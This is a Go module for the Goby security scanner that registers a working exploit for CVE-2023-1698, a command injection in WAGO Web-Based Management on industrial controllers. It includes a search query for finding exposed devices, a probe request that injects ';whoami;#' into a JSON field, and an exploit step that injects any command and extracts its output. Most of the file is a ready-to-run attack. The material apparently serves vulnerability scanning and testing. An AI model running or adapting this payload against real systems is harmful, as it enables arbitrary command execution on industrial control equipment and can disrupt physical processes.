package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WAGO-Web-Based-Management /wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php Code Execution Vulnerabilities(CVE-2023-1698)",
    "Description": "<p>The WAGO system is a state-of-the-art industrial automation and monitoring solution that integrates the Internet of Things (IoT) architecture and modern web technologies to provide a powerful, flexible, and user-friendly platform. The WAGO SCADA system allows users to monitor and control the entire industrial process in real-time from any location, ensuring the continuity of the production process and increasing production efficiency. The system collects large amounts of industrial site data and provides deep insights through built-in reporting tools to help optimize production decisions. </p><p> Code execution vulnerabilities allow attackers to take control of affected systems by injecting malicious instructions or scripts, which may lead to serious consequences such as data breaches, system damages, service interruptions, privilege escalation, and malware spread, posing a significant threat to the data security, economic interests, and reputation of enterprises or individuals.</p>",
    "Product": "WAGO-Web-Based-Management",
    "Homepage": "https://www.wago.com.cn/",
    "DisclosureDate": "2024-05-15",
    "PostTime": "2024-05-15",
    "Author": "2974057526@qq.com",
    "FofaQuery": "title==\"Web-based Management\"",
    "GobyQuery": "title==\"Web-based Management\"",
    "Level": "3",
    "Impact": "<p>Code execution vulnerabilities allow attackers to take control of affected systems by injecting malicious instructions or scripts, which may lead to serious consequences such as data breaches, system damages, service interruptions, privilege escalation, and malware spread, posing a significant threat to the data security, economic interests, and reputation of enterprises or individuals.</p>",
    "Recommendation": "<p>Input validation: Rigorous validation of all user input ensures that the input is in the expected format and type. You can use the whitelist method to allow only inputs that are known to be safe. </p><p>Code review and security testing: Conduct regular code reviews and use automated tools for security testing to identify potential security vulnerabilities.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"package\":\";whoami;#\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "\"license\":false",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"package\":\";{{{cmd}}};#\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "\"license\":false",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|\"license\":\"(.*?)\\\\n"
            ]
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2023-1698"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "WAGO-Web-Based-Management /wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php 代码执行漏洞 (CVE-2023-1698)",
            "Product": "WAGO-Web-Based-Management",
            "Description": "<p>WAGO系统是一种先进的工业自动化和监控解决方案，它集成了物联网(IoT)架构和现代Web技术，提供了一个强大、灵活且用户友好的平台。WAGO SCADA系统允许用户从任何地点实时监测和控制整个工业过程，确保生产过程的连续性，并提高生产效率。这个系统收集大量工业现场数据，并通过内置的报表工具提供深入的洞察，有助于优化生产决策 。<br></p><p>代码执行漏洞允许攻击者通过注入恶意指令或脚本，从而控制受影响的系统，可能导致数据泄露、系统破坏、服务中断、权限提升、恶意软件传播等严重后果，对企业或个人的数据安全、经济利益和声誉造成重大威胁。<br></p>",
            "Recommendation": "<p>输入验证：对所有用户输入进行严格的验证，确保输入符合预期的格式和类型。可以使用白名单方法，只允许已知安全的输入。&nbsp;</p><p>代码审查和安全测试：定期进行代码审查，使用自动化工具进行安全测试，以发现潜在的安全漏洞。<br></p>",
            "Impact": "<p>代码执行漏洞允许攻击者通过注入恶意指令或脚本，从而控制受影响的系统，可能导致数据泄露、系统破坏、服务中断、权限提升、恶意软件传播等严重后果，对企业或个人的数据安全、经济利益和声誉造成重大威胁。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "WAGO-Web-Based-Management /wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php Code Execution Vulnerabilities(CVE-2023-1698)",
            "Product": "WAGO-Web-Based-Management",
            "Description": "<p>The WAGO system is a state-of-the-art industrial automation and monitoring solution that integrates the Internet of Things (IoT) architecture and modern web technologies to provide a powerful, flexible, and user-friendly platform. The WAGO SCADA system allows users to monitor and control the entire industrial process in real-time from any location, ensuring the continuity of the production process and increasing production efficiency. The system collects large amounts of industrial site data and provides deep insights through built-in reporting tools to help optimize production decisions.&nbsp;</p><p>&nbsp;Code execution vulnerabilities allow attackers to take control of affected systems by injecting malicious instructions or scripts, which may lead to serious consequences such as data breaches, system damages, service interruptions, privilege escalation, and malware spread, posing a significant threat to the data security, economic interests, and reputation of enterprises or individuals.<br></p>",
            "Recommendation": "<p>Input validation: Rigorous validation of all user input ensures that the input is in the expected format and type. You can use the whitelist method to allow only inputs that are known to be safe.&nbsp;</p><p>Code review and security testing: Conduct regular code reviews and use automated tools for security testing to identify potential security vulnerabilities.<br></p>",
            "Impact": "<p>Code execution vulnerabilities allow attackers to take control of affected systems by injecting malicious instructions or scripts, which may lead to serious consequences such as data breaches, system damages, service interruptions, privilege escalation, and malware spread, posing a significant threat to the data security, economic interests, and reputation of enterprises or individuals.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10950"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}